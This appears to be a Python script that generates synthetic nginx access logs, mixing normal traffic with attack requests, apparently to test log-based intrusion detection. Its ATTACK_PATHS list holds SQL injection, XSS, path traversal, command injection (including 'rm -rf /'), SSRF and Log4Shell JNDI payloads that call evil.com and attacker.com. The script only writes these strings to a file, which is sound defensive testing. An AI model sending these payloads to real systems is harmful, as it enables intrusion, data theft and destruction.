import random
import argparse
from datetime import datetime


NORMAL_PATHS = [
    "/", "/home", "/login", "/products", "/about", "/contact",
    "/api/items", "/dashboard", "/profile", "/static/app.js"
]

ATTACK_PATHS = {
    "sqli": [
        "/login?user=admin' OR 1=1--",
        "/products?id=1 UNION SELECT username,password FROM users",
        "/search?q=' OR 'a'='a",
        "/item?id=1; DROP TABLE users--"
    ],
    "xss": [
        "/search?q=<script>alert(1)</script>",
        "/comment?msg=<img src=x onerror=alert(1)>",
        "/profile?name=javascript:alert(document.cookie)"
    ],
    "traversal": [
        "/../../etc/passwd",
        "/download?file=../../../etc/passwd",
        "/static/..%2f..%2f..%2fetc%2fpasswd",
        "/windows/win.ini"
    ],
    "cmdi": [
        "/api?cmd=whoami",
        "/run?exec=cat /etc/passwd",
        "/debug?cmd=rm -rf /",
        "/ping?host=127.0.0.1;id"
    ],
    "log4shell": [
        "/?q=${jndi:ldap://evil.com/a}",
        "/login?user=${jndi:rmi://attacker.com/x}",
    ],
    "ssrf": [
        "/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/proxy?url=http://localhost:8080/admin",
        "/api?url=http://127.0.0.1:5000/internal"
    ],
    "scanner": [
        "/wp-admin",
        "/wp-login.php",
        "/phpmyadmin",
        "/.git/config",
        "/.env",
        "/backup.zip",
        "/admin.php"
    ],
    "flood": [
        "/login",
        "/api/items",
        "/search?q=test",
        "/dashboard"
    ]
}

IPS = [
    "127.0.0.1", "192.168.1.10", "192.168.1.11",
    "10.0.0.5", "172.16.1.20", "203.0.113.50"
]

METHODS = ["GET", "POST", "GET", "GET"]


def nginx_line(ip: str, method: str, path: str, status: int, size: int) -> str:
    timestamp = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0100")
    return f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size}'


def generate_normal() -> str:
    return nginx_line(
        ip=random.choice(IPS),
        method=random.choice(METHODS),
        path=random.choice(NORMAL_PATHS),
        status=random.choice([200, 200, 200, 301, 404]),
        size=random.randint(300, 5000)
    )


def generate_attack(mode: str) -> str:
    if mode == "mixed":
        mode = random.choice(list(ATTACK_PATHS.keys()))

    if mode not in ATTACK_PATHS:
        return generate_normal()

    ip = random.choice(IPS)

    if mode == "flood":
        ip = "203.0.113.250"

    return nginx_line(
        ip=ip,
        method=random.choice(METHODS),
        path=random.choice(ATTACK_PATHS[mode]),
        status=random.choice([200, 403, 404, 500]),
        size=random.randint(100, 3000)
    )


def generate_logs(mode: str, count: int, output: str):
    lines = []

    for _ in range(count):
        if mode == "normal":
            lines.append(generate_normal())
        elif mode == "mixed":
            if random.random() < 0.65:
                lines.append(generate_normal())
            else:
                lines.append(generate_attack("mixed"))
        else:
            if random.random() < 0.25:
                lines.append(generate_normal())
            else:
                lines.append(generate_attack(mode))

    with open(output, "w") as f:
        for line in lines:
            f.write(line + "\n")

    print(f"Generated {count} logs in {output}")
    print(f"Mode: {mode}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", default="mixed", choices=[
        "normal", "sqli", "xss", "traversal", "cmdi",
        "log4shell", "ssrf", "scanner", "flood", "mixed"
    ])
    parser.add_argument("--count", type=int, default=1000)
    parser.add_argument("--output", default="data/access.log")

    args = parser.parse_args()
    generate_logs(args.mode, args.count, args.output)
